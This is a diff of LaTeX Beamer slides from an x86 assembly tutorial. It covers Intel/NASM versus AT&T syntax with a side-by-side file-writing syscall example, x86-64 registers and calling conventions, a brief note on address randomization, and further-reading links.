+    \item User program address space is randomized to make it difficult to guess shared library function locations or stack variable locations
+    \item Increases difficulty of finding a suitable return address
+  \end{itemize}
+\end{itemize}
+\end{frame}
+
+\section{Advanced Topic 15: Comparisons with Atmel AVR and ARM}
+
+\section{Extra Topic 1: Intel/nasm Syntax}
+
+\begin{frame}[fragile,t]
+\frametitle{Differences}
+\begin{itemize}
+  \item Intel Syntax: {\ttfamily <mnemonic> <dest>, <src>}
+  \item Less prefixes/suffixes floating around, so source looks cleaner
+  \item Instruction size usually implied by registers used, but is made explicit when necessary with {\ttfamily byte, word, dword} keywords
+  \begin{itemize}
+    \item {\ttfamily mov [ebp-4], dword 42}
+  \end{itemize}
+  \pause
+  \item Memory addresses are just plain symbol names
+  \item Memory dereferenced with brackets {\ttfamily [ ... ]}
+  \pause
+  \vs
+  \item Indirect memory acceses spelled out as expressions
+  \item AT\&T / GAS: {\ttfamily movl \%eax, -12(\%ebp, \%ecx, 4)}
+  \item Intel / NASM: {\ttfamily mov [ebp+ecx*4-12], eax}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Side-by-side Hello World Syscall Example (example-20.asm)}
+\mvs \mvs
+\begin{columns}[T]
+\column{0.5\textwidth}
+\begin{gascode*}{frame=single}
+.section .text
+.global _start
+_start:
+  # open("foo", ...);
+  movl $0x05, %eax
+  movl $filename, %ebx
+  movl $0x41, %ecx
+  movl $0644, %edx
+  int $0x80
+
+  # fd in %eax -> %ebx
+  movl %eax, %ebx
+
+  # write(fd, ...);
+  movl $0x04, %eax
+  # fd in %ebx from above
+  movl $message, %ecx
+  movl $messageLen, %edx
+  int $0x80
+
+  # close(fd);
+  movl $0x06, %eax
+  # fd still in %ebx
+  int $0x80
+\end{gascode*}
+\column{0.5\textwidth}
+\begin{nasmcode*}{frame=single}
+section .text
+global _start
+_start:
+  ; open("foo", ...);
+  mov eax, 5
+  mov ebx, filename
+  mov ecx, 0x41
+  mov edx, 0q644
+  int 0x80
+
+  ; fd in eax -> ebx
+  mov ebx, eax
+
+  ; write(fd, ...);
+  mov eax, 4
+  ; fd in ebx from above
+  mov ecx, message
+  mov edx, messageLen
+  int 0x80
+
+  ; close(fd);
+  mov eax, 6
+  ; fd still in ebx
+  int 0x80
+\end{nasmcode*}
+\end{columns}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Side-by-side Hello World Syscall Example (example-20.asm) Continued}
+\mvs
+\begin{columns}[T]
+\column{0.5\textwidth}
+\begin{gascode*}{frame=single}
+  # exit(0);
+  movl $0x01, %eax
+  movl $0x0, %ebx
+  int $0x80
+
+.section .data
+filename:   .ascii "foo\0"
+message:    .ascii "Hello World!\n"
+.equ messageLen, . - message
+\end{gascode*}
+\column{0.5\textwidth}
+\begin{nasmcode*}{frame=single}
+  ; exit(0);
+  mov eax, 1
+  mov ebx, 0
+  int 0x80
+
+section .data
+filename:   db 'foo',0
+message:    db 'Hello World!',10,0
+messageLen: equ $ - message
+\end{nasmcode*}
+\end{columns}
+\vs
+{\footnotesize Runtime:}
+\begin{textcode}
+$ nasm -f elf example-20.asm -o example-20.o
+$ ld example-20.o -o example-20
+$ ./example-20
+$ cat foo
+Hello World!
+$
+\end{textcode}
+\end{frame}
+
+\section{Extra Topic 2: x86-64 Assembly}
+
+\begin{frame}[fragile,t]
+\frametitle{Immediate Differences}
+\begin{itemize}
+  \item {\ttfamily \%eax} extended to 64-bit {\ttfamily \%rax} \\
+  {\ttfamily \%rax, \%rbx, \%rcx, \%rdx, \%rbp, \%rsp, \%rsi, \%rdi}
+  \item Supplemental general purpose registers \\
+  {\ttfamily \%r8, \%r9, \%r10, \%r11, \%r12, \%r13, \%r14, \%r15}
+  \vs \vs
+  \item Good architectural changes
+  \begin{itemize}
+    \item Segmentation and hardware task switching wiped away
+    \item No-Execute bit in page table entries
+  \end{itemize}
+  \vs
+  \item A lot of q's instead of l's: {\ttfamily movq, pushq, addq}
+  \item Stack pushes and pops are all typically 8-byte / 64-bit values
+  \item {\small \url{http://en.wikipedia.org/wiki/X86-64#Architectural\_features}}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,t]
+\frametitle{Different Calling Convention}
+\begin{itemize}
+  \item System V ABI
+  \item \url{http://www.x86-64.org/documentation/abi.pdf}
+  \item Function Call Convention (Linux)
+  \begin{itemize}
+    \item Arguments passed in registers: {\ttfamily \%rdi, \%rsi, \%rdx, \%rcx, \%r8, \%r9}
+    \item Extra arguments pushed onto the stack
+    \item Function must preserve {\ttfamily \%rbp, \%rbx, \%r12 - \%r15}
+    \item Function can use rest of registers
+    \item Return value in {\%rax}
+  \end{itemize}
+  \item System Call Convention (Linux)
+  \begin{itemize}
+    \item Syscall number in {\ttfamily \%rax}
+    \item Arguments passed in registers: {\ttfamily \%rdi, \%rsi, \%rdx, \%r10, \%r8, \%r9}
+    \item Use {\ttfamily syscall} instruction
+    \item {\ttfamily \%rcx} and {\ttfamily \%r11} destroyed
+    \item Return value in {\%rax}
+  \end{itemize}
+\end{itemize}
+\end{frame}
 
 \section{Resources and Next Steps}
 
@@ -2317,6 +3273,7 @@ $
   \item Official x86-32 + x86-64 architecture info: \\ \url{http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html}
   \item Unofficial x86-32 + x86-64 architecture info: \\ \url{http://sandpile.org/}
   \item Linux System Call Reference: \\ \url{http://syscalls.kernelgrok.com/}
+  \item Assembly Optimization Tips: \\ \url{http://www.mark.masmcode.com/}
   \item Interesting "assembly gems": \\ \url{http://www.df.lth.se/~john\_e/fr\_gems.html}
 \end{itemize}
 \end{frame}
@@ -2324,12 +3281,13 @@ $
 \begin{frame}[fragile,t]
 \frametitle{Going From Here}
 \begin{itemize}
-  \item Practice the basics
+  \item Play with the examples
   \item Write your own syscall, e.g. rot13
   \item Do Stack Smashing challenges: \\ \url{http://community.corest.com/~gera/InsecureProgramming/}
   \item Rewrite a traditional *nix program in Assembly
   \item e.g. telnet: \\ {\small \url{https://github.com/vsergeev/x86asm/blob/master/telnet.asm}}
   \item e.g. asmscan: \\ {\small \url{https://github.com/edma2/asmscan}}
+  \item Write assembly for microcontrollers like Atmel AVR and ARM
 \end{itemize}
 \end{frame}
 
